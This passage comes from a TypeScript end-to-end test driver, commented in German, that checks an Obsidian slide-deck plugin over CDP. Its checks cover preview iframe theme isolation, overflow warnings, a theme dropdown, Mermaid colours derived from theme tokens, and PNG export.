 *  an der Diagrammart. Der berechnete Wert deckt beide ab.
 *
 *  Der Aufruf steht in `pollUntil`, weil Mermaid asynchron rendert: `renderMermaidSlots`
 *  laeuft nach dem Folienaufbau, und zwischen "Folie steht" und "Grafik steht" liegt ein
 *  Fenster, in dem hier nichts zu finden waere — ein Punkt ohne Warten waere zufaellig rot. */
async function mermaidKnoten(cdp: Cdp): Promise<MermaidKnoten | null> {
  return pollUntil<MermaidKnoten>(cdp, `
    ${DECK_DOC}
    if (!deck) return null;
    const svg = deck.querySelector(".sd-mermaid svg, svg[id^='sd-mermaid']");
    if (!svg) return null;
    const knoten = svg.querySelectorAll(".node rect, .node polygon, .basic.label-container, rect.basic");
    if (knoten.length === 0) return null;
    return { fill: deck.defaultView.getComputedStyle(knoten[0]).fill, knoten: knoten.length };
  `, 20_000);
}

/** "rgb(r, g, b)" gegen ein Zieltripel, mit derselben Toleranz wie der Pixel-Vergleich in D2
 *  (Rundung beim Rendern). Ein nicht lesbarer String ist FALSCH, nicht gleich — sonst waere
 *  ein Punkt gruen, weil die Messung misslang. */
function nahAn(rgb: string, ziel: [number, number, number]): boolean {
  const teile = rgb.match(/\d+/g)?.slice(0, 3).map(Number);
  return Boolean(teile) && teile!.length === 3 && teile!.every((v, i) => Math.abs(v - ziel[i]) <= 8);
}

interface WarnRow { sev: string; title: string; text: string }

/** Die Warnzeilen der Vorschau mit Schwere-Klasse, `title` und Text. */
const WARN_ROWS = `
  const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
  const rows = leaf ? [...leaf.view.containerEl.querySelectorAll(".sd-warn")] : [];
  const warnRows = rows.map((r) => ({
    sev: ([...r.classList].find((c) => c.startsWith("sd-warn-sev-")) || "").replace("sd-warn-sev-", ""),
    title: r.getAttribute("title") || "",
    text: r.textContent.trim(),
  }));
`;

/** Das Wort, das der `title` einer Warnzeile tragen muss — EN oder DE, je App-Sprache.
 *  Beide Woerterbuecher zulassen, statt die Sprache zu raten: falsch geraten waere rot am
 *  Werkzeug, und das Wort selbst kommt so oder so aus `i18n.ts`, nicht aus dem Treiber. */
function severityWords(sev: string): string[] {
  return [STRINGS_EN[`warn.severity.${sev}`], STRINGS_DE[`warn.severity.${sev}`]].filter(Boolean) as string[];
}

/** Streifen am Folienrand, gemessen am EFFEKT: der Vorschau-Chrome zeichnet ihn als
 *  `inset`-box-shadow in die Folie. Klasse allein reicht nicht — ohne PREVIEW_CHROME_CSS
 *  im iframe raegt sie inert mit und faerbt nichts. */
const STRIPE = (index: number): string => `
  ${DECK_DOC}
  const folie = deck ? deck.querySelectorAll(".sd-slide")[${index}] : null;
  if (!folie) return { da: false, klassen: "", schatten: "" };
  return { da: true, klassen: folie.className, schatten: getComputedStyle(folie).boxShadow };
`;
interface Stripe { da: boolean; klassen: string; schatten: string }

/** (a) Schluessel, die es im Woerterbuch gibt und die trotzdem als Text dastehen. */
function bekannteSichtbar(text: string): string[] {
  return Object.keys(STRINGS_EN).filter((key) => text.includes(key));
}

/** (b) Schluessel, die es NICHT gibt: erkennbar an einem bekannten Namensraum vor dem Punkt.
 *  Die Praefixe kommen aus dem Woerterbuch, damit ein neuer Namensraum nicht uebersehen wird.
 *
 *  ⚠️ **Kein `\b` vor dem Praefix** — die erste Fassung hatte eines und fand nichts, obwohl der
 *  rohe Schluessel dastand. `textContent` klebt die Texte benachbarter Knoten ohne Trenner
 *  aneinander; im Tab steht deshalb "...-Keysettings.themesFolder.name", und zwischen "y" und
 *  "s" ist keine Wortgrenze. Gefunden hat das erst die Gegenprobe: bei entferntem Schluessel
 *  blieb der Punkt gruen. Ein Falschtreffer waere hier ohnehin das kleinere Uebel — er wird
 *  laut und untersucht, ein verpasster Treffer nicht. */
function unbekannteSichtbar(text: string): string[] {
  const praefixe = [...new Set(Object.keys(STRINGS_EN).map((k) => k.split(".")[0]))];
  const muster = new RegExp(`(?:${praefixe.join("|")})(?:\\.[a-zA-Z][a-zA-Z0-9]*){2,}`, "g");
  return text.match(muster) ?? [];
}

// --- Prüfpunkte --------------------------------------------------------------

interface Section {
  key: string;
  title: string;
  run: (cdp: Cdp, ctx: Ctx) => Promise<void>;
}

interface Ctx {
  port: number;
  vault?: string;
}

/** A — die Vorschau. Der Weg Notiz → Deck → iframe, den kein Unit-Test sieht. */
const vorschau: Section = {
  key: "vorschau",
  title: "A · Vorschau (iframe-Naht)",
  async run(cdp) {
    const folien = await openPreview(cdp, DECK_NOTE);

    const ort = await cdp.evaluate<string>(`
      const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
      if (!leaf) return "keine View";
      const rechts = app.workspace.rightSplit;
      return leaf.getRoot() === rechts ? "rechte Seitenleiste" : "anderer Split";
    `);
    record("A1 Vorschau oeffnet in der rechten Seitenleiste", ort === "rechte Seitenleiste", ort);

    record(
      `A2 Deck rendert im isolierten iframe (${DECK_SLIDES} Folien erwartet)`,
      folien === DECK_SLIDES,
      folien === DECK_SLIDES ? `${folien} Folien` : `${folien} Folien · ${await diagnose(cdp)}`,
    );

    // A3 misst die Kernzusage des Plugins: das Vault-Theme erreicht die Folien nicht.
    // Gemessen wird am EFFEKT (Hintergrundfarbe im iframe), und die Gegenkontrolle gehoert
    // dazu: aendert sich die Elternfarbe nicht mit, hat der Punkt keinen Gegenstand und
    // waere ausgerechnet im Defektfall gruen.
    const isolation = await cdp.evaluate<{ elternVor: string; elternNach: string; deckVor: string; deckNach: string; fehler?: string }>(`
      ${DECK_DOC}
      if (!deck) return { elternVor: "", elternNach: "", deckVor: "", deckNach: "", fehler: "kein Deck-iframe" };
      const folie = deck.querySelector(".sd-slide");
      if (!folie) return { elternVor: "", elternNach: "", deckVor: "", deckNach: "", fehler: "keine Folie im iframe" };
      const lies = () => ({
        eltern: getComputedStyle(document.body).backgroundColor,
        deck: getComputedStyle(folie).backgroundColor,
      });
      const vor = lies();
      // Die fluechtigste Ebene waehlen: app.changeTheme() schriebe nach appearance.json und
      // machte aus einem system-folgenden Vault einen fest eingestellten.
      const war = document.body.classList.contains("theme-dark");
      document.body.classList.toggle("theme-dark", !war);
      document.body.classList.toggle("theme-light", war);
      app.workspace.trigger("css-change");
      await new Promise((r) => setTimeout(r, 900));
      const nach = lies();
      document.body.classList.toggle("theme-dark", war);
      document.body.classList.toggle("theme-light", !war);
      app.workspace.trigger("css-change");
      await new Promise((r) => setTimeout(r, 400));
      return { elternVor: vor.eltern, elternNach: nach.eltern, deckVor: vor.deck, deckNach: nach.deck };
    `);
    const elternWechselte = isolation.elternVor !== isolation.elternNach && isolation.elternVor !== "";
    const deckBlieb = isolation.deckVor === isolation.deckNach && isolation.deckVor !== "";
    record(
      "A3 Vault-Theme erreicht die Folien nicht",
      elternWechselte && deckBlieb,
      isolation.fehler
        ? isolation.fehler
        : `Obsidian ${isolation.elternVor} → ${isolation.elternNach}` +
          ` · Folie ${isolation.deckVor} → ${isolation.deckNach}` +
          (elternWechselte ? "" : " · ACHTUNG: das Eltern-Theme wechselte nicht, der Punkt hatte keinen Gegenstand"),
    );

    // A4: Fremd-CSS (highlight.js) kommt ueber deckCss in den iframe. Gemessen an der
    // Wirkung — ein gefaerbtes Token —, nicht an der Existenz eines <style>-Knotens.
    const hljs = await cdp.evaluate<{ gefunden: boolean; token: string; text: string }>(`
      ${DECK_DOC}
      if (!deck) return { gefunden: false, token: "", text: "" };
      const pre = deck.querySelector("pre code.hljs, code.hljs, .hljs");
      if (!pre) return { gefunden: false, token: "", text: "" };
      const span = pre.querySelector("span[class^='hljs-'], span[class*=' hljs-']");
      return {
        gefunden: Boolean(span),
        token: span ? getComputedStyle(span).color : "",
        text: getComputedStyle(pre).color,
      };
    `);
    record(
      "A4 Code-Hervorhebung erreicht den iframe",
      hljs.gefunden && hljs.token !== "" && hljs.token !== hljs.text,
      hljs.gefunden ? `Token ${hljs.token} vs. Fliesstext ${hljs.text}` : "kein hljs-Token im Deck gefunden",
    );

    // A5: fit-or-warn. Die Warnung traegt ein Formzeichen, nicht nur eine Farbe — das ist
    // die WCAG-1.4.1-Zusage, die das Plugin den Callouts nebenan gibt.
    const folienOverflow = await openPreview(cdp, OVERFLOW_NOTE);
    const warn = await cdp.evaluate<{ anzahl: number; text: string; zeichen: boolean }>(`
      const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
      const rows = leaf ? [...leaf.view.containerEl.querySelectorAll(".sd-warn")] : [];
      const text = rows.map((r) => r.textContent.trim()).join(" | ");
      return { anzahl: rows.length, text, zeichen: /[▲●ℹ]/.test(text) };
    `);
    record(
      "A5 Overflow wird gewarnt, nicht beschnitten",
      warn.anzahl > 0 && warn.zeichen,
      warn.anzahl > 0
        ? `${warn.anzahl} Warnung(en): ${warn.text.slice(0, 120)}`
        : `keine Warnung · ${folienOverflow} Folien · ${await diagnose(cdp)}`,
    );

    // A6: die Farbe der Warnung ist ihre SCHWERE, nicht ihre Art — `error` zeichnet einen
    // roten Streifen in die Folie. Gemessen am Effekt (inset-Schatten im iframe), und die
    // Warnzeile muss den Schwere-Namen als `title` tragen (zweiter Kanal neben Farbe und
    // Formzeichen, WCAG 1.4.1). Das Deck ist noch die Overflow-Notiz aus A5.
    const rot = await cdp.evaluate<Stripe>(STRIPE(0));
    const zeilenOverflow = await cdp.evaluate<WarnRow[]>(`${WARN_ROWS} return warnRows;`);
    const errorZeile = zeilenOverflow.find((r) => r.sev === "error");
    const rotStreifen = rot.da && /(^|\s)sd-slide-warn(\s|$)/.test(rot.klassen) && /inset/.test(rot.schatten);
    const errorTitel = Boolean(errorZeile) && severityWords("error").includes(errorZeile!.title);
    record(
      "A6 Overflow-Folie traegt den roten Streifen, Warnzeile den Schwere-Namen als title",
      rotStreifen && errorTitel,
      !rot.da
        ? "keine Folie im iframe"
        : `Folie: ${/inset/.test(rot.schatten) ? "inset-Schatten" : "KEIN inset-Schatten"} (${rot.klassen})` +
          ` · title="${errorZeile ? errorZeile.title : "(keine error-Zeile)"}" erwartet ${JSON.stringify(severityWords("error"))}`,
    );

    // A7: das Dropdown schaltet ephemer — Wirkung sofort sichtbar, Notiz unangetastet.
    // Zwei Haelften, weil genau die Trennung die dokumentierte Zusage ist ("Setzen"
    // schreibt, das Dropdown nicht).
    await openPreview(cdp, DECK_NOTE);
    const wechsel = await cdp.evaluate<{ von: string; nach: string; vorher: string; nachher: string; frontmatter: string; fehler?: string }>(`
      ${DECK_DOC}
      const select = leaf && leaf.view.containerEl.querySelector("select.sd-toolbar-theme");
      if (!deck || !select) return { von: "", nach: "", vorher: "", nachher: "", frontmatter: "", fehler: "Dropdown oder Deck fehlt" };
      const folie = deck.querySelector(".sd-slide");
      const vorher = getComputedStyle(folie).backgroundColor;
      const aktuell = select.value;
      const andere = [...select.options].map((o) => o.value).filter((v) => v && v !== aktuell);
      if (!andere.length) return { von: aktuell, nach: "", vorher, nachher: "", frontmatter: "", fehler: "nur ein Theme im Dropdown" };
      select.value = andere[0];
      select.dispatchEvent(new Event("change"));
      await new Promise((r) => setTimeout(r, 1500));
      const frame2 = leaf.view.containerEl.querySelector("iframe.sd-deck-iframe");
      const folie2 = frame2 && frame2.contentDocument && frame2.contentDocument.querySelector(".sd-slide");
      const nachher = folie2 ? getComputedStyle(folie2).backgroundColor : "";
      const datei = app.vault.getAbstractFileByPath(${JSON.stringify(DECK_NOTE)});
      const inhalt = await app.vault.read(datei);
      const treffer = inhalt.match(/^theme:\\s*(\\S+)/m);
      return { von: aktuell, nach: andere[0], vorher, nachher, frontmatter: treffer ? treffer[1] : "(keine)" };
    `);
    const sichtbar = wechsel.vorher !== "" && wechsel.nachher !== "" && wechsel.vorher !== wechsel.nachher;
    const ephemer = wechsel.frontmatter === wechsel.von;
    record(
      "A7 Theme-Dropdown wirkt sofort und laesst die Notiz in Ruhe",
      sichtbar && ephemer,
      wechsel.fehler
        ? wechsel.fehler
        : `${wechsel.von} → ${wechsel.nach}: ${wechsel.vorher} → ${wechsel.nachher}` +
          ` · Frontmatter bleibt "${wechsel.frontmatter}"` +
          (sichtbar ? "" : " · ACHTUNG: kein sichtbarer Unterschied") +
          (ephemer ? "" : " · ACHTUNG: die Notiz wurde geschrieben"),
    );

    // A8: der Erweiterungsweg darf nicht wie ein Defekt aussehen. Ein Theme darf eigene
    // Layoutnamen fuehren; der Kern reicht sie als `info` durch — und `info` faerbt nichts.
    // Vor deck-core 0.5.0 stand hier ein amber Streifen (`layout-unknown` nach kind gefaerbt).
    // Der Punkt hat nur dann einen Gegenstand, wenn die info-Zeile da ist: fehlt sie, wurde
    // der Name gar nicht als unbekannt erkannt, und "kein Streifen" bewiese nichts.
    await ensureRegressionNote(cdp);
    const folienRegression = await openPreview(cdp, REGRESSION_NOTE);
    const eigen = await cdp.evaluate<Stripe>(STRIPE(REGRESSION_CUSTOM_LAYOUT));
    const zeilenRegression = await cdp.evaluate<WarnRow[]>(`${WARN_ROWS} return warnRows;`);
    const infoZeile = zeilenRegression.find((r) => r.sev === "info" && r.text.includes(`#${REGRESSION_CUSTOM_LAYOUT + 1}`));
    const ohneStreifen = eigen.da && !/sd-slide-warn/.test(eigen.klassen) && !/inset/.test(eigen.schatten);
    const infoTitel = Boolean(infoZeile) && severityWords("info").includes(infoZeile!.title);
    record(
      "A8 Eigener Layoutname: Hinweiszeile (info), aber kein Streifen an der Folie",
      folienRegression === REGRESSION_SLIDES && ohneStreifen && infoTitel,
      folienRegression !== REGRESSION_SLIDES
        ? `${folienRegression} Folien statt ${REGRESSION_SLIDES} · ${await diagnose(cdp)}`
        : `Folie ${REGRESSION_CUSTOM_LAYOUT + 1}: ${ohneStreifen ? "kein Streifen" : "GESTREIFT"} (${eigen.klassen})` +
          ` · info-Zeile ${infoZeile ? `"${infoZeile.text.slice(0, 70)}" title="${infoZeile.title}"` : "FEHLT"}`,
    );
  },
};

/** M — Mermaid-Farben eines ORDNER-Themes. Der Prueffall, den `deck-core` strukturell nicht
 *  fuehren kann: `mermaidVarsFromDocument` haengt eine `.sd-slide`-Sonde ins Deck-Dokument und
 *  liest die Tokens per `getComputedStyle` — ohne Browser gibt es nichts zu messen, und
 *  `vitest` laeuft dort wie hier mit `environment: "node"`.
 *
 *  Warum das ein eigener Abschnitt ist und nicht ein Punkt in A: er stellt seinen Gegenstand
 *  selbst her (Theme-Datei + Notiz), und er misst am gerenderten SVG, nicht am CSS. Mermaid
 *  inlined seine Farben in die Grafik; eine CSS-Regel im Deck erreicht sie nicht. Genau
 *  deshalb existiert die Token-Ableitung ueberhaupt. */
const mermaid: Section = {
  key: "mermaid",
  title: "M · Mermaid-Farben aus Theme-Tokens",
  async run(cdp) {
    const themesFolder = await cdp.evaluate<string>(`
      return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.themesFolder;
    `);
    const cssPfad = `${themesFolder}/${MERMAID_THEME_KEY}.css`;

    // Ordner und Dateien anlegen — ueber den Vault, nicht ueber `fs`: der Treiber kann per
    // --vault an jedes Fenster andocken, und dann liegt der Vault nicht dort, wo dieses
    // Skript ihn vermuten wuerde. Alles Angelegte geht ins Papierkorb-Protokoll.
    const dateien: Array<[string, string]> = [
      [cssPfad, mermaidThemeCss()],
      [MERMAID_NOTE, MERMAID_NOTE_MD],
      [PIE_NOTE, PIE_NOTE_MD],
      [SENDER_NOTE, SENDER_NOTE_MD],
      [MOD_NOTE, MOD_NOTE_MD],
    ];
    const angelegt = await cdp.evaluate<{ ordner: boolean; neu: string[] }>(`
      const ordner = ${JSON.stringify(themesFolder)};
      const neuerOrdner = !(await app.vault.adapter.exists(ordner));
      if (neuerOrdner) await app.vault.createFolder(ordner);
      const neu = [];
      for (const [pfad, inhalt] of ${JSON.stringify(dateien)}) {
        const da = app.vault.getAbstractFileByPath(pfad);
        if (da) await app.vault.modify(da, inhalt);
        else { await app.vault.create(pfad, inhalt); neu.push(pfad); }
      }
      await new Promise((r) => setTimeout(r, 600));
      return { ordner: neuerOrdner, neu };
    `);
    if (angelegt.ordner) erzeugtePfade.push(themesFolder);
    for (const pfad of angelegt.neu) {
      // Der Themes-Ordner raeumt seinen Inhalt mit weg — ein zweiter Eintrag dafuer waere
      // beim Aufraeumen ein Fehlschlag auf einer laengst geloeschten Datei.
      if (angelegt.ordner && pfad.startsWith(themesFolder + "/")) continue;
      erzeugtePfade.push(pfad);
    }

    /** Das Ordner-Theme auf einen anderen Fall stellen und die Registry nachziehen. Beides
     *  gehoert zusammen: `modify` loest die Neuregistrierung NICHT aus (s. `refreshThemes`),
     *  und ein Punkt, der das vergisst, misst das Theme des vorigen Punkts und ist gruen,
     *  ohne seinen Gegenstand gesehen zu haben — am 2026-09-04 genau so passiert. */
    const stelleTheme = async (opts: ThemeOpts): Promise<void> => {
      await cdp.evaluate(`
        const datei = app.vault.getAbstractFileByPath(${JSON.stringify(cssPfad)});
        await app.vault.modify(datei, ${JSON.stringify(mermaidThemeCss(opts))});
        await new Promise((r) => setTimeout(r, 400));
        return true;
      `);
      await refreshThemes(cdp);
    };

    // M1: die Tokens des Ordner-Themes erreichen das Diagramm.
    await refreshThemes(cdp);
    await openPreview(cdp, MERMAID_NOTE);
    const m1 = await mermaidKnoten(cdp);
    record(
      "M1 Ordner-Theme faerbt das Diagramm ueber seine Tokens",
      Boolean(m1) && nahAn(m1!.fill, MERMAID_PROBE_RGB),
      m1
        ? `Knotenfuellung ${m1.fill} (${m1.knoten} Knoten) · Probe rgb(${MERMAID_PROBE_RGB.join(",")})` +
          (nahAn(m1.fill, MERMAID_PROBE_RGB) ? "" : " · ACHTUNG: die Tokens des Themes erreichen Mermaid nicht")
        : `kein Mermaid-SVG im Deck · ${await diagnose(cdp)}`,
    );

    // M2: eine ausdrueckliche `sd-mermaid`-Angabe schlaegt die Ableitung (`mermaidPinned`).
    // Ohne diesen Punkt waere M1 auch dann gruen, wenn die Ableitung eine bewusste
    // Theme-Entscheidung ueberstimmt — der Fehler, den deck-core 0.6.0 hatte und 0.6.1 behob.
    await stelleTheme({ pin: true });
    await openPreview(cdp, MERMAID_NOTE);
    const m2 = await mermaidKnoten(cdp);
    record(
      "M2 sd-mermaid-Angabe schlaegt die Token-Ableitung",
      Boolean(m2) && !nahAn(m2!.fill, MERMAID_PROBE_RGB),
      m2
        ? `Knotenfuellung ${m2.fill} (benanntes Thema "dark") · nicht rgb(${MERMAID_PROBE_RGB.join(",")})` +
          (nahAn(m2.fill, MERMAID_PROBE_RGB) ? " · ACHTUNG: die Tokens ueberstimmen die Angabe" : "")
        : `kein Mermaid-SVG im Deck · ${await diagnose(cdp)}`,
    );

    // M4: der `sender:`-Slot steht im gerenderten Deck. Er kam mit deck-core 0.9.0 und war
    // bis hierher nur am Kern belegt — dass `parseDeck` ihn liest, sagt nichts darueber, ob
    // `appendSlots` ihn baut und das Struktur-CSS ihn sichtbar macht. Gemessen wird deshalb
    // die BREITE, nicht die Existenz: eine Klasse ohne Regel haengt inert im Baum (dieselbe
    // Lehre wie beim Warn-Streifen in A7). Gegenprobe im selben Punkt, weil ein Punkt, der
    // nur die Anwesenheit prueft, auch dann gruen bliebe, wenn das Deck den Slot
    // bedingungslos baut.
    const senderFolien = await openPreview(cdp, SENDER_NOTE);
    const mitSender = await cdp.evaluate<{ da: boolean; text: string; breite: number }>(`
      ${DECK_DOC}
      const el = deck ? deck.querySelector(".sd-slide-sender") : null;
      if (!el) return { da: false, text: "", breite: 0 };
      return { da: true, text: el.textContent.trim(), breite: el.getBoundingClientRect().width };
    `);
    await openPreview(cdp, MERMAID_NOTE);
    const ohneSender = await cdp.evaluate<number>(`
      ${DECK_DOC}
      return deck ? deck.querySelectorAll(".sd-slide-sender").length : -1;
    `);
    const senderOk = mitSender.da && mitSender.text === SENDER_TEXT && mitSender.breite > 0;
    record(
      "M4 sender-Slot steht sichtbar im Deck (und fehlt ohne die Direktive)",
      senderOk && ohneSender === 0,
      senderFolien === 0
        ? `Pruefling rendert nicht · ${await diagnose(cdp)}`
        : `mit sender: ${mitSender.da ? `"${mitSender.text}" ${Math.round(mitSender.breite)}px` : "KEIN Element"}` +
          (mitSender.da && mitSender.text !== SENDER_TEXT ? ` · ACHTUNG: erwartet "${SENDER_TEXT}"` : "") +
          (mitSender.da && mitSender.breite === 0 ? " · ACHTUNG: ohne Breite — Klasse ohne Regel" : "") +
          ` · ohne sender: ${ohneSender} Elemente` +
          (ohneSender > 0 ? " · ACHTUNG: der Slot entsteht auch ohne die Direktive" : ""),
    );

    // M5: ein Theme darf seine eigenen Modifier deklarieren (`sd-modifiers`, deck-core
    // 0.9.0/0.10.0). Die Kette laeuft ueber vier Module und zwei Repos; `tests/adapter.test.ts`
    // prueft sie strukturell, aber nichts prueft, was in der VORSCHAU ankommt. Gemessen wird
    // die Warnzeile, weil sie das ist, was der Autor sieht: mit Deklaration keine, ohne eine.
    const modZeilen = async (): Promise<{ unbekannt: number; alle: number }> => cdp.evaluate(`
      const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
      const rows = leaf ? [...leaf.view.containerEl.querySelectorAll(".sd-warn")] : [];
      return {
        unbekannt: rows.filter((r) => r.classList.contains("sd-warn-modifier-unknown")).length,
        alle: rows.length,
      };
    `);
    await stelleTheme({ modifiers: [THEME_MOD] });
    const modFolien = await openPreview(cdp, MOD_NOTE);
    const mitDekl = await modZeilen();
    // Gegenprobe: dieselbe Notiz, dasselbe Theme MINUS der einen Zeile. Ohne sie belegte der
    // Punkt nur, dass irgendetwas keine Warnung erzeugt — die Bewegung aus der
    // Consumer-Ketten-Naht in `tests/adapter.test.ts`.
    await stelleTheme({});
    await openPreview(cdp, MOD_NOTE);
    const ohneDekl = await modZeilen();
    record(
      `M5 Theme-eigener Modifier "${THEME_MOD}" warnt nicht (ohne Deklaration schon)`,
      modFolien > 0 && mitDekl.unbekannt === 0 && ohneDekl.unbekannt === 1,
      modFolien === 0
        ? `Pruefling rendert nicht · ${await diagnose(cdp)}`
        : `mit sd-modifiers: ${mitDekl.unbekannt} modifier-unknown (${mitDekl.alle} Warnzeilen)` +
          (mitDekl.unbekannt > 0 ? " · ACHTUNG: die Deklaration erreicht den Parser nicht" : "") +
          ` · ohne: ${ohneDekl.unbekannt}` +
          (ohneDekl.unbekannt === 0 ? " · ACHTUNG: es warnt auch ohne Deklaration — der Punkt misst nichts" : ""),
    );

    // M3: `sd-mermaid-var` (deck-core 0.7.0) traegt bis ins PNG. Der teuerste Punkt des
    // Abschnitts, und der einzige, der exportieren MUSS: in der Ansicht wirkt eine
    // `!important`-Regel gegen Mermaids SVG-CSS, im Export nicht (`getDiffStyle` schreibt nur
    // Abweichungen vom Default inline, und `opacity: 1` IST der Default). Am DOM gemessen
    // waere dieser Punkt gruen, waehrend der Nutzer ein blasses Segment bekommt — genau der
    // Befund vom 2026-09-04, der die Direktive ueberhaupt ausgeloest hat.
    const exportOrdner = await cdp.evaluate<string>(`
      return app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.exportFolder;
    `);
    const pieOrdner = `${exportOrdner}/${PIE_NOTE.replace(/\.md$/, "")}`;
    const pieBild = `${pieOrdner}/01-${PIE_NOTE.replace(/\.md$/, "")}.png`;

    /** Einmal exportieren und die voll deckenden Probe-Pixel zaehlen.
     *
     *  ⚠️ Das ALTE Bild wird vorher geloescht, und darauf steht der ganze Punkt: M3 laeuft
     *  zweimal ueber dieselbe Notiz, und ein Poll auf `exists` + `size` faende beim zweiten
     *  Mal sofort das Artefakt des ersten Laufs — beide Faelle lieferten dieselbe Zahl, der
     *  Punkt waere gruen und haette nichts gemessen (offener Befund an D1/D2, s. Cockpit).
     *  Nach dem Loeschen kann eine gefundene Datei nur die neue sein. */
    const pieVollePixel = async (): Promise<number | null> => {
      await cdp.evaluate(`
        const adapter = app.vault.adapter;
        if (await adapter.exists(${JSON.stringify(pieOrdner)})) await adapter.rmdir(${JSON.stringify(pieOrdner)}, true);
        return true;
      `);
      await clearNotices(cdp);
      await openPreview(cdp, PIE_NOTE);
      await cdp.evaluate(`
        await app.commands.executeCommandById("${PLUGIN_ID}:export-images");
        return true;
      `);
      return pollUntil<number>(cdp, `
        const adapter = app.vault.adapter;
        const pfad = ${JSON.stringify(pieBild)};
        if (!(await adapter.exists(pfad))) return null;
        const s = await adapter.stat(pfad);
        if (!s || s.size < 1024) return null;
        const bmp = await createImageBitmap(new Blob([await adapter.readBinary(pfad)], { type: "image/png" }));
        const c = document.createElement("canvas"); c.width = bmp.width; c.height = bmp.height;
        const ctx = c.getContext("2d"); ctx.drawImage(bmp, 0, 0);
        const d = ctx.getImageData(0, 0, bmp.width, bmp.height).data;
        const [zr, zg, zb] = ${JSON.stringify(PIE_PROBE_RGB)};
        let voll = 0;
        for (let i = 0; i < d.length; i += 4) {
          if (Math.abs(d[i] - zr) <= 4 && Math.abs(d[i + 1] - zg) <= 4 && Math.abs(d[i + 2] - zb) <= 4) voll++;
        }
        // 0 waere nicht von "noch nicht geschrieben" zu unterscheiden — als -1 melden, damit
        // der Poll nicht bis zum Timeout auf ein Bild wartet, das laengst dasteht.
        return voll === 0 ? -1 : voll;
      `, 90_000, 2000);
    };

    // Der Ja-Fall stellt sein Theme SELBST her, statt den Stand des vorigen Punkts zu erben:
    // M5 hinterlaesst das Theme im Grundzustand, und ohne diese Zeile maesse der Ja-Fall ein
    // Segment ohne Probefarbe. Genau so beim ersten Lauf passiert — gefangen hat es die
    // Gegenprobe, weil sie den hoeheren Wert lieferte als der Fall, der gewinnen soll.
    await stelleTheme({ pie: true, pieOpacity: true });
    const mitVar = await pieVollePixel();
    // Gegenprobe: dasselbe Theme, dieselbe Notiz, nur ohne `pieOpacity 1`. Mermaid zeichnet
    // das Segment dann mit seiner Voreinstellung 0.7, und die Probefarbe kommt nirgends mehr
    // rein durch.
    await stelleTheme({ pie: true });
    const ohneVar = await pieVollePixel();
    if (mitVar !== null && !erzeugtePfade.includes(exportOrdner)) erzeugtePfade.push(exportOrdner);
    const genug = (n: number | null): boolean => n !== null && n >= PIE_VOLL_MIN;
    record(
      "M3 sd-mermaid-var traegt bis ins PNG (pieOpacity 1 gegen Mermaids 0.7)",
      genug(mitVar) && !genug(ohneVar) && ohneVar !== null,
      mitVar === null || ohneVar === null
        ? `kein Export-PNG (${mitVar === null ? "Ja-Fall" : "Gegenprobe"}) unter "${pieBild}" · ${await diagnose(cdp)}`
        : `mit pieOpacity: ${Math.max(mitVar, 0)} volle Probe-Pixel · ohne: ${Math.max(ohneVar, 0)}` +
          ` · Schwelle ${PIE_VOLL_MIN}` +
          (genug(mitVar) ? "" : " · ACHTUNG: die Deklaration erreicht das PNG nicht") +
          (genug(ohneVar) ? " · ACHTUNG: auch ohne sie voll deckend — der Punkt misst nicht die Direktive" : ""),
    );

    // Das Theme fuer einen etwaigen naechsten Lauf auf den Ausgangsfall zuruecksetzen. Ohne
    // das stuende bei `--keep` ein pie-gefaerbtes Theme im Vault und M1 maesse beim naechsten
    // Mal einen Zustand, den dieser Lauf hinterlassen hat.
    await stelleTheme({});
  },
};

/** Der Wortlaut der entfernten Zeile (Welle 17), von Hand festgehalten: die i18n-Schluessel gibt es nicht mehr. */
const ALTE_MODELL_BESCHREIBUNG = ["Model id sent to the endpoint", "Modell-ID, die an den Endpunkt gesendet wird"];
interface TabInhalt { gefunden: boolean; text: string; endpunkte: number; placeholders: string[]; namen: string[]; optionen: string[] }
interface OffenerTab { ziel: Cdp; eigenesFenster: boolean; tab: TabInhalt }

/** Den Plugin-Tab oeffnen und seinen Inhalt lesen. Erst im Hauptfenster nach dem Modal sehen,
 *  sonst auf das Settings-Fenster verbinden (ab Obsidian 1.13 ein eigenes Fenster). Nie ueber
 *  den Fenstertitel entscheiden — sein erstes Wort ist lokalisiert. */
async function oeffneTab(cdp: Cdp, ctx: Ctx): Promise<OffenerTab> {
  await cdp.evaluate(`
    app.setting.open();
    app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 1200));
    return true;
  `);
  let ziel: Cdp = cdp;
  let eigenesFenster = false;
  const imHauptfenster = await cdp.evaluate<boolean>(`
    return Boolean(document.querySelector(".modal.mod-settings .vertical-tab-content"));
  `);
  if (!imHauptfenster) {
    const settings = await attachTo("settings", ctx.port, ctx.vault);
    if (settings) {
      ziel = settings;
      eigenesFenster = true;
    }
  }
  const tab = await ziel.evaluate<TabInhalt>(`
    const wurzel = document.querySelector(".vertical-tab-content-container .vertical-tab-content")
      ?? document.querySelector(".vertical-tab-content");
    if (!wurzel) return { gefunden: false, text: "", endpunkte: 0, placeholders: [], namen: [], optionen: [] };
    return {
      gefunden: true,
      text: wurzel.textContent,
      endpunkte: wurzel.querySelectorAll(".okit-ep-row").length,
      placeholders: [...wurzel.querySelectorAll("input[placeholder]")].map((i) => i.placeholder),
      namen: [...wurzel.querySelectorAll(".setting-item-name")].map((n) => (n.textContent ?? "").trim()),
      optionen: [...wurzel.querySelectorAll("select option")].map((o) => (o.textContent ?? "").trim()),
    };
  `);
  return { ziel, eigenesFenster, tab };
}

interface HostMessung { display: string; kinder: number; stapelt: boolean }
interface LayoutMessung {
  hosts: HostMessung[];
  /** Gegenkontrolle: ist ein GEWOEHNLICHES `.setting-item` in dieser Obsidian-Version
   *  ueberhaupt eine Flex-Row? Ohne diese Frage misst B5 nichts. */
  normalIstFlex: boolean;
  normalDisplay: string;
}

/** Das gerechnete Layout der §8-Host-Elemente. Gemessen wird der EFFEKT, nicht die Klasse:
 *  `settingBodyHost()` strippt `setting-item`, aber ob die Zeilen dann wirklich stapeln, sagt
 *  erst die Geometrie. „Stapelt" heisst: mindestens zwei Kinder, verschiedene `top`, gleiche
